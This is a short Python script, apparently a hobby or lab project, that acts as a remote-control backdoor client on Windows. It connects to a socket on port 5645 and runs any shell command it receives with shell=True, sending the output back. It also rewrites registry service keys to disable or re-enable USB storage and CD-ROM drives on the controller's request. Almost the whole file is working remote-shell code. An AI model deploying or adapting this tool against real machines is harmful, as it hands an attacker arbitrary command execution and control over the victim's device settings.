# programmer Milad Taleb

import socket
from subprocess import check_output
from platform import *
from winreg import *

s = socket.socket(2, 1)
s.connect(("localhost", 5645))
print("connected to port", 5645,"\n")

def switch_status_USB(word):
    keyval = 'SYSTEM\\CurrentControlSet\\Services\\UASPStor'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE, keyval, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE, keyval)
    SetValueEx(key, 'start', 0, REG_DWORD, word)
    CloseKey(key)

def switch_status_CD(word):
    keyval = 'SYSTEM\\CurrentControlSet\\Services\\cdrom'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE, keyval, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE, keyval)
    SetValueEx(key, 'start', 0, REG_DWORD, word)
    CloseKey(key)

while True:
    os_version = platform()
    s.sendall(os_version.encode())
    
    choose = s.recv(1024).decode()
    if choose == "1":
        command = s.recv(1024).decode()
        try:
            result = check_output(command,shell=True)
            s.sendall(result)
        except:
            s.sendall("your command is wrong\n".encode())
    elif choose == "2":
        switch_status_CD(4)
        switch_status_USB(4)
        s.sendall("Finished :) ".encode())
    elif choose == "3":
        switch_status_CD(1)
        switch_status_USB(3)
        s.sendall("Finished :) ".encode())
    elif choose == "4":
        break
    else:
        print("your input is wrong\n---------------------------------")

s.close()
